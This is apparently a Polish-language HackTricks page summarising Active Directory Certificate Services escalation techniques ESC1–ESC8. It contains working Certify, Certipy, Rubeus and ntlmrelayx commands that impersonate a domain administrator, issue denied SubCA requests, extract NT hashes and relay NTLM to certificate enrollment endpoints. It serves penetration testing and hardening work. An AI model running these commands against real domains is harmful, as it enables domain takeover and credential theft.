# Eskalacja w domenie AD CS

{{#include ../../../banners/hacktricks-training.md}}


**To jest podsumowanie sekcji dotyczących technik eskalacji z następujących postów:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Błędnie skonfigurowane szablony certyfikatów - ESC1

### Wyjaśnienie

### Wyjaśnienie błędnie skonfigurowanych szablonów certyfikatów - ESC1

- **Enterprise CA przyznaje uprawnienia do rejestracji certyfikatów użytkownikom o niskich uprawnieniach.**
- **Zatwierdzenie przez przełożonego nie jest wymagane.**
- **Nie są wymagane podpisy upoważnionego personelu.**
- **Deskryptory zabezpieczeń szablonów certyfikatów są zbyt liberalne, umożliwiając użytkownikom o niskich uprawnieniach uzyskanie uprawnień do rejestracji.**
- **Szablony certyfikatów są skonfigurowane tak, aby definiować EKU ułatwiające uwierzytelnianie:**
- Uwzględniane są identyfikatory Extended Key Usage (EKU), takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) lub brak EKU (SubCA).
- **Szablon zezwala wnioskodawcom na dołączenie subjectAltName do Certificate Signing Request (CSR):**
- Active Directory (AD) nadaje priorytet subjectAltName (SAN) w certyfikacie podczas weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że określając SAN w CSR, można zażądać certyfikatu w celu podszycia się pod dowolnego użytkownika (np. administratora domeny). To, czy wnioskodawca może określić SAN, wskazuje właściwość `mspki-certificate-name-flag` w obiekcie AD szablonu certyfikatu. Ta właściwość jest maską bitową, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` zezwala wnioskodawcy na określenie SAN.

> [!CAUTION]
> Opisana konfiguracja pozwala użytkownikom o niskich uprawnieniach żądać certyfikatów z dowolnie wybranym SAN, umożliwiając uwierzytelnianie jako dowolny principal domeny za pośrednictwem Kerberos lub SChannel.

Ta funkcja jest czasami włączana w celu obsługi generowania certyfikatów HTTPS lub certyfikatów hosta w locie przez produkty lub usługi wdrożeniowe albo z powodu braku zrozumienia.

Należy zauważyć, że utworzenie certyfikatu z tą opcją wywołuje ostrzeżenie, co nie ma miejsca w przypadku skopiowania istniejącego szablonu certyfikatu (takiego jak szablon `WebServer`, w którym włączono `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) i następnie zmodyfikowania go w celu dodania OID uwierzytelniania.

### Abuse

Aby **znaleźć podatne szablony certyfikatów**, można uruchomić:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Aby **wykorzystać tę lukę do podszycia się pod administratora**, można uruchomić:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Następnie możesz przekształcić wygenerowany **certyfikat do formatu `.pfx`** i użyć go ponownie do **uwierzytelniania za pomocą Rubeus lub certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binarne pliki systemu Windows „Certreq.exe” i „Certutil.exe” mogą zostać użyte do wygenerowania PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumerację szablonów certyfikatów w schemacie konfiguracji AD Forest, w szczególności tych, które nie wymagają zatwierdzenia ani podpisów, posiadają EKU Client Authentication lub Smart Card Logon oraz mają włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, można przeprowadzić, uruchamiając następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Nieprawidłowo skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

Drugi scenariusz nadużycia jest wariantem pierwszego:

1. Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawa do rejestracji.
2. Wymóg zatwierdzenia przez przełożonego jest wyłączony.
3. Wymóg zastosowania autoryzowanych podpisów został pominięty.
4. Zbyt liberalny deskryptor zabezpieczeń szablonu certyfikatu przyznaje użytkownikom o niskich uprawnieniach prawa do rejestracji certyfikatów.
5. **Szablon certyfikatu jest skonfigurowany tak, aby zawierał Any Purpose EKU lub nie zawierał EKU.**

**Any Purpose EKU** umożliwia attackerowi uzyskanie certyfikatu w **dowolnym celu**, w tym do uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu itd. Do wykorzystania tego scenariusza można zastosować tę samą **technikę używaną w ESC3**.

Certyfikaty **bez EKU**, które działają jako certyfikaty podrzędnego CA, mogą zostać wykorzystane w **dowolnym celu** i mogą **również służyć do podpisywania nowych certyfikatów**. Attacker może więc określić dowolne EKU lub pola w nowych certyfikatach, korzystając z certyfikatu podrzędnego CA.

Nowe certyfikaty utworzone na potrzeby **uwierzytelniania w domenie** nie będą działać, jeśli podrzędny CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Mimo to attacker nadal może tworzyć **nowe certyfikaty z dowolnym EKU** i dowolnymi wartościami certyfikatu. Mogą one zostać potencjalnie **wykorzystane** do szerokiego zakresu celów (np. podpisywania kodu, uwierzytelniania serwera itd.) i mogą mieć istotne konsekwencje dla innych aplikacji w sieci, takich jak SAML, AD FS lub IPSec.

Aby wyliczyć szablony pasujące do tego scenariusza w schemacie konfiguracji AD Forest, można wykonać następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Błędnie skonfigurowane szablony Enrollment Agent - ESC3

### Wyjaśnienie

Ten scenariusz przypomina pierwszy i drugi, ale **wykorzystuje** **inny EKU** (Certificate Request Agent) oraz **2 różne szablony** (dlatego ma 2 zestawy wymagań),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), znany w dokumentacji Microsoft jako **Enrollment Agent**, umożliwia principalowi **zarejestrowanie się** w celu uzyskania **certyfikatu** w **imieniu innego użytkownika**.

**„Enrollment agent”** rejestruje się w takim **szablonie** i używa uzyskanego **certyfikatu do współpodpisania CSR w imieniu innego użytkownika**. Następnie **wysyła** **współpodpisany CSR** do CA, rejestrując się w **szablonie**, który **zezwala na „enroll on behalf of”**, a CA odpowiada **certyfikatem należącym do „innego” użytkownika**.

**Wymagania 1:**

- Enterprise CA przyznaje uprawnienia do rejestracji użytkownikom o niskich uprawnieniach.
- Pominięto wymaganie zatwierdzenia przez przełożonego.
- Nie ma wymogu dotyczącego autoryzowanych podpisów.
- Deskryptor zabezpieczeń szablonu certyfikatu jest nadmiernie liberalny i przyznaje uprawnienia do rejestracji użytkownikom o niskich uprawnieniach.
- Szablon certyfikatu zawiera Certificate Request Agent EKU, umożliwiając żądanie innych szablonów certyfikatów w imieniu innych principalów.

**Wymagania 2:**

- Enterprise CA przyznaje uprawnienia do rejestracji użytkownikom o niskich uprawnieniach.
- Zatwierdzenie przez przełożonego jest pomijane.
- Wersja schematu szablonu wynosi 1 lub jest wyższa niż 2, a szablon określa wymaganie Application Policy Issuance Requirement, które wymaga Certificate Request Agent EKU.
- EKU zdefiniowany w szablonie certyfikatu zezwala na uwierzytelnianie w domenie.
- Ograniczenia dotyczące enrollment agents nie są stosowane na CA.

### Wykorzystanie

Możesz użyć [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy), aby wykorzystać ten scenariusz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Użytkownicy**, którzy mogą **uzyskać** **certyfikat agenta rejestracji**, szablony, w których agenci rejestracji mogą dokonywać rejestracji, oraz **konta**, w imieniu których agent rejestracji może działać, mogą być ograniczane przez enterprise CA. Osiąga się to poprzez otwarcie **snap-inu** `certsrc.msc`, **kliknięcie prawym przyciskiem myszy CA**, wybranie opcji **Properties**, a następnie przejście do karty „Enrollment Agents”.

Należy jednak zauważyć, że **domyślne** ustawienie CA to „**Do not restrict enrollment agents**”. Gdy administratorzy włączą ograniczenie dotyczące agentów rejestracji, ustawiając opcję „Restrict enrollment agents”, domyślna konfiguracja nadal pozostaje niezwykle liberalna. Umożliwia ona **Everyone** rejestrację we wszystkich szablonach jako dowolna osoba.

## Kontrola dostępu do podatnego szablonu certyfikatu - ESC4

### **Wyjaśnienie**

**Deskryptor zabezpieczeń** na **szablonach certyfikatów** definiuje **uprawnienia**, które posiadają określone **podmioty AD** w odniesieniu do szablonu.

Jeżeli **atakujący** posiada wymagane **uprawnienia** do **modyfikowania** **szablonu** i **wprowadzenia** dowolnych **podatnych na wykorzystanie błędnych konfiguracji** opisanych we **wcześniejszych sekcjach**, może to ułatwić privilege escalation.

Najważniejsze uprawnienia dotyczące szablonów certyfikatów obejmują:

- **Owner:** Zapewnia niejawną kontrolę nad obiektem, umożliwiając modyfikację dowolnych atrybutów.
- **FullControl:** Zapewnia pełną kontrolę nad obiektem, w tym możliwość modyfikowania dowolnych atrybutów.
- **WriteOwner:** Umożliwia zmianę właściciela obiektu na podmiot kontrolowany przez atakującego.
- **WriteDacl:** Umożliwia modyfikację kontroli dostępu, potencjalnie przyznając atakującemu FullControl.
- **WriteProperty:** Umożliwia edytowanie dowolnych właściwości obiektu.

### Abuse

Aby zidentyfikować podmioty posiadające prawa edycji szablonów i innych obiektów PKI, wykonaj enumerację za pomocą Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Przykład `privesc`, podobny do poprzedniego:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 występuje, gdy użytkownik ma uprawnienia zapisu do szablonu certyfikatu. Można to na przykład wykorzystać do nadpisania konfiguracji szablonu certyfikatu, aby stał się podatny na ESC1.

Jak widać na powyższej ścieżce, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nową krawędź `AddKeyCredentialLink` prowadzącą do `JOHNPC`. Ponieważ ta technika jest powiązana z certyfikatami, zaimplementowałem również ten atak, znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Oto krótki przykład użycia polecenia `shadow auto` z Certipy do pobrania skrótu NT ofiary.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** może nadpisać konfigurację szablonu certyfikatu za pomocą jednej komendy. **Domyślnie** Certipy **nadpisze** konfigurację, aby uczynić ją **podatną na ESC1**. Możemy również określić **`-save-old parameter`, aby zapisać starą konfigurację**, co będzie przydatne do **przywrócenia** konfiguracji po naszym ataku.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kontrola dostępu do podatnych obiektów PKI - ESC5

### Wyjaśnienie

Rozbudowana sieć wzajemnie powiązanych relacji opartych na ACL, obejmująca kilka obiektów poza szablonami certyfikatów i urzędem certyfikacji, może wpływać na bezpieczeństwo całego systemu AD CS. Obiekty te, które mogą znacząco wpływać na bezpieczeństwo, obejmują:

- Obiekt komputera AD serwera CA, który może zostać przejęty za pomocą mechanizmów takich jak S4U2Self lub S4U2Proxy.
- Serwer RPC/DCOM serwera CA.
- Dowolny podrzędny obiekt AD lub kontener znajdujący się w określonej ścieżce kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ścieżka ta obejmuje między innymi kontenery i obiekty takie jak kontener Certificate Templates, kontener Certification Authorities, obiekt NTAuthCertificates oraz Enrollment Services Container.

Bezpieczeństwo systemu PKI może zostać naruszone, jeśli atakujący o niskich uprawnieniach zdoła przejąć kontrolę nad którymkolwiek z tych kluczowych komponentów.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Wyjaśnienie

Temat omówiony w [**poście CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) porusza również konsekwencje flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, zgodnie z opisem firmy Microsoft. Ta konfiguracja, po aktywowaniu na Certification Authority (CA), umożliwia dołączanie **wartości zdefiniowanych przez użytkownika** do **subject alternative name** dla **dowolnego żądania**, w tym żądań tworzonych na podstawie Active Directory®. W rezultacie rozwiązanie to pozwala **intruzowi** na enroll przez **dowolny template** skonfigurowany do **authentication** w domenie — w szczególności przez te, które pozwalają **unprivileged** użytkownikom na enroll, takie jak standardowy User template. Dzięki temu można uzyskać certyfikat umożliwiający intruzowi uwierzytelnienie jako administrator domeny lub **dowolna inna aktywna tożsamość** w domenie.

**Uwaga**: Sposób dodawania **alternative names** do Certificate Signing Request (CSR) za pomocą argumentu `-attrib "SAN:"` w `certreq.exe` (określanego jako „Name Value Pairs”) różni się od strategii wykorzystywania SAN w ESC1. Różnica polega na tym, **w jaki sposób informacje o koncie są enkapsulowane** — w atrybucie certyfikatu, a nie w rozszerzeniu.

### Nadużycie

Aby sprawdzić, czy to ustawienie jest aktywne, organizacje mogą użyć następującego polecenia z `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ta operacja zasadniczo wykorzystuje **zdalny dostęp do rejestru**, dlatego alternatywnym podejściem może być:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) potrafią wykrywać tę błędną konfigurację i ją wykorzystywać:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Aby zmienić te ustawienia, zakładając posiadanie uprawnień **administratora domeny** lub równoważnych, można wykonać następujące polecenie z dowolnej stacji roboczej:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Aby wyłączyć tę konfigurację w swoim środowisku, flagę można usunąć za pomocą:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Po aktualizacjach zabezpieczeń z maja 2022 r. nowo wydane **certyfikaty** będą zawierać **security extension**, która uwzględnia właściwość `objectSid` **requestera**. W przypadku ESC1 ten SID jest wyprowadzany z określonego SAN. Jednak w przypadku **ESC6** SID odzwierciedla `objectSid` **requestera**, a nie SAN.\
> Aby wykorzystać ESC6, system musi być podatny na ESC10 (Weak Certificate Mappings), które nadaje priorytet **SAN** przed nowym **security extension**.

## Kontrola dostępu podatnego Certificate Authority - ESC7

### Attack 1

#### Wyjaśnienie

Kontrola dostępu do Certificate Authority jest realizowana za pomocą zestawu uprawnień określających działania CA. Uprawnienia te można wyświetlić, otwierając `certsrv.msc`, klikając prawym przyciskiem myszy CA, wybierając właściwości, a następnie przechodząc do karty Security. Dodatkowo uprawnienia można enumerować za pomocą modułu PSPKI, używając poleceń takich jak:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Zapewnia to wgląd w podstawowe uprawnienia, a mianowicie **`ManageCA`** i **`ManageCertificates`**, odpowiadające odpowiednio rolom „CA administrator” i „Certificate Manager”.

#### Abuse

Posiadanie uprawnień **`ManageCA`** w urzędzie certyfikacji umożliwia principalowi zdalne modyfikowanie ustawień za pomocą PSPKI. Obejmuje to włączenie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, aby zezwolić na określanie SAN w dowolnym szablonie, co stanowi kluczowy element domain escalation.

Uproszczenie tego procesu jest możliwe dzięki użyciu cmdletu **Enable-PolicyModuleFlag** z PSPKI, który umożliwia wprowadzanie modyfikacji bez bezpośredniej interakcji z GUI.

Posiadanie uprawnień **`ManageCertificates`** umożliwia zatwierdzanie oczekujących żądań, skutecznie omijając zabezpieczenie „CA certificate manager approval”.

Połączenie modułów **Certify** i **PSPKI** można wykorzystać do zażądania, zatwierdzenia i pobrania certyfikatu:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Atak 2

#### Wyjaśnienie

> [!WARNING]
> W **poprzednim ataku** uprawnienia **`Manage CA`** zostały użyte do **włączenia** flagi **EDITF_ATTRIBUTESUBJECTALTNAME2** w celu przeprowadzenia **ataku ESC6**, ale nie będzie to miało żadnego efektu, dopóki usługa CA (`CertSvc`) nie zostanie uruchomiona ponownie. Gdy użytkownik ma prawo dostępu `Manage CA`, może również **uruchomić usługę ponownie**. Nie oznacza to jednak, że użytkownik może uruchomić usługę ponownie zdalnie. Ponadto atak E**SC6 może nie działać od razu** w większości środowisk z zainstalowanymi poprawkami z powodu aktualizacji zabezpieczeń z maja 2022 roku.

Dlatego przedstawiono tutaj inny atak.

Wymagania wstępne:

- Tylko uprawnienie **`ManageCA`**
- Uprawnienie **`Manage Certificates`** (może zostać przyznane z poziomu **`ManageCA`**)
- Szablon certyfikatu **`SubCA`** musi być **włączony** (można go włączyć z poziomu **`ManageCA`**)

Technika opiera się na fakcie, że użytkownicy posiadający prawa dostępu `Manage CA` _oraz_ `Manage Certificates` mogą **wystawiać odrzucone żądania certyfikatów**. Szablon certyfikatu **`SubCA`** jest **podatny na ESC1**, ale tylko **administratorzy** mogą dokonać enrollmentu w tym szablonie. W związku z tym **użytkownik** może **wysłać żądanie** enrollmentu w **`SubCA`** — które zostanie **odrzucone** — ale następnie zostanie wydane przez administratora.

#### Nadużycie

Możesz **przyznać sobie prawo dostępu `Manage Certificates`**, dodając swojego użytkownika jako nowego oficera.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Szablon **`SubCA`** można **włączyć na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Jeśli spełniliśmy wymagania wstępne tego ataku, możemy rozpocząć od **zażądania certyfikatu na podstawie szablonu `SubCA`**.

**Ten wniosek zostanie odrzucony**, ale zachowamy klucz prywatny i zanotujemy identyfikator wniosku.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mając **`Manage CA` i `Manage Certificates`**, możemy następnie **wystawić odrzucone żądanie certyfikatu** za pomocą polecenia `ca` i parametru `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I na koniec możemy **pobrać wydany certyfikat** za pomocą polecenia `req` i parametru `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Wyjaśnienie

Oprócz klasycznych nadużyć ESC7 (włączania atrybutów EDITF lub zatwierdzania oczekujących żądań), **Certify 2.0** ujawniło zupełnie nowy mechanizm, który wymaga wyłącznie roli *Manage Certificates* (inaczej **Certificate Manager / Officer**) na Enterprise CA.

Metoda RPC `ICertAdmin::SetExtension` może zostać wykonana przez dowolny principal posiadający uprawnienie *Manage Certificates*. Chociaż metoda ta była tradycyjnie używana przez legalne CA do aktualizowania rozszerzeń w **oczekujących** żądaniach, attacker może ją wykorzystać do **dołączenia *niestandardowego* rozszerzenia certyfikatu** (na przykład własnego OID *Certificate Issuance Policy*, takiego jak `1.1.1.1`) do żądania oczekującego na zatwierdzenie.

Ponieważ docelowy template **nie definiuje wartości domyślnej dla tego rozszerzenia**, CA **NIE** nadpisze wartości kontrolowanej przez attackera, gdy żądanie zostanie ostatecznie wystawione. W rezultacie certyfikat zawiera rozszerzenie wybrane przez attackera, które może:

* Spełniać wymagania Application / Issuance Policy innych podatnych template'ów (prowadząc do privilege escalation).
* Wstrzykiwać dodatkowe EKU lub policies, które nadają certyfikatowi nieoczekiwany poziom zaufania w systemach third-party.

Krótko mówiąc, *Manage Certificates* – wcześniej uznawane za „mniej potężną” część ESC7 – może być teraz wykorzystane do pełnego privilege escalation lub długoterminowego persistence, bez modyfikowania konfiguracji CA i bez wymagania bardziej restrykcyjnego uprawnienia *Manage CA*.

#### Nadużywanie tego mechanizmu za pomocą Certify 2.0

1. **Prześlij żądanie certyfikatu, które pozostanie *oczekujące*.** Można to wymusić za pomocą template'u wymagającego zatwierdzenia przez managera:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Dołącz niestandardowe rozszerzenie do oczekującego żądania** za pomocą nowej komendy `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Jeśli template nie definiuje już rozszerzenia *Certificate Issuance Policies*, powyższa wartość zostanie zachowana po wystawieniu certyfikatu.*

3. **Wystaw żądanie** (jeśli Twoja rola ma również uprawnienia zatwierdzania *Manage Certificates*) lub zaczekaj, aż operator je zatwierdzi. Po wystawieniu pobierz certyfikat:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Otrzymany certyfikat zawiera teraz złośliwy OID issuance-policy i może zostać wykorzystany w kolejnych atakach (np. ESC13, domain escalation itd.).

> UWAGA: Ten sam atak można wykonać za pomocą Certipy ≥ 4.7, używając komendy `ca` i parametru `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Wyjaśnienie

> [!TIP]
> W środowiskach, w których **zainstalowano AD CS**, jeśli istnieje **podatny web enrollment endpoint** oraz opublikowano co najmniej jeden **certificate template**, który zezwala na enrollment komputerów domenowych i client authentication (na przykład domyślny template **`Machine`**), możliwe staje się **przejęcie dowolnego komputera, na którym działa usługa spooler**!

AD CS obsługuje kilka **metod enrollment opartych na HTTP**, udostępnianych za pośrednictwem dodatkowych ról serwera, które administratorzy mogą zainstalować. Interfejsy te, służące do enrollment certyfikatów przez HTTP, są podatne na **ataki NTLM relay**. Attacker, działając z **compromised machine, może impersonate dowolne konto AD, które uwierzytelnia się za pośrednictwem inbound NTLM**. Podczas impersonation konta ofiary attacker może uzyskać dostęp do tych interfejsów i **zażądać certyfikatu client authentication za pomocą template'ów certyfikatów `User` lub `Machine`**.

- **Web enrollment interface** (starsza aplikacja ASP dostępna pod adresem `http://<caserver>/certsrv/`) domyślnie korzysta wyłącznie z HTTP, które nie zapewnia ochrony przed atakami NTLM relay. Dodatkowo jawnie zezwala wyłącznie na uwierzytelnianie NTLM za pośrednictwem nagłówka Authorization HTTP, przez co bezpieczniejsze metody uwierzytelniania, takie jak Kerberos, nie mają zastosowania.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service oraz **Network Device Enrollment Service** (NDES) domyślnie obsługują authentication negotiate za pośrednictwem nagłówka Authorization HTTP. Uwierzytelnianie Negotiate **obsługuje zarówno** Kerberos, jak i **NTLM**, umożliwiając attackerowi **obniżenie poziomu do** authentication NTLM podczas ataków relay. Chociaż te web services domyślnie włączają HTTPS, samo HTTPS **nie chroni przed atakami NTLM relay**. Ochrona usług NTLM relay działających przez HTTPS jest możliwa wyłącznie wtedy, gdy HTTPS jest połączone z channel binding. Niestety AD CS nie aktywuje Extended Protection for Authentication w IIS, które jest wymagane do channel binding.

Częstym **problemem** ataków NTLM relay jest **krótki czas trwania sesji NTLM** oraz brak możliwości interakcji attackera z usługami, które **wymagają podpisywania NTLM**.

Ograniczenie to można jednak obejść, wykorzystując atak NTLM relay do uzyskania certyfikatu dla użytkownika, ponieważ okres ważności certyfikatu określa czas trwania sesji, a certyfikatu można używać z usługami, które **wymagają podpisywania NTLM**. Instrukcje dotyczące używania skradzionego certyfikatu znajdują się tutaj:


{{#ref}}
account-persistence.md
{{#endref}}

Kolejnym ograniczeniem ataków NTLM relay jest to, że **maszyna kontrolowana przez attackera musi zostać uwierzytelniona przez konto ofiary**. Attacker może zaczekać lub spróbować **wymusić** to uwierzytelnienie:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Nadużycie**

[**Certify**](https://github.com/GhostPack/Certify)'s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Właściwość `msPKI-Enrollment-Servers` jest używana przez firmowe urzędy certyfikacji (CA) do przechowywania endpointów Certificate Enrollment Service (CES). Te endpointy można przeanalizować i wyświetlić za pomocą narzędzia **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuse with Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
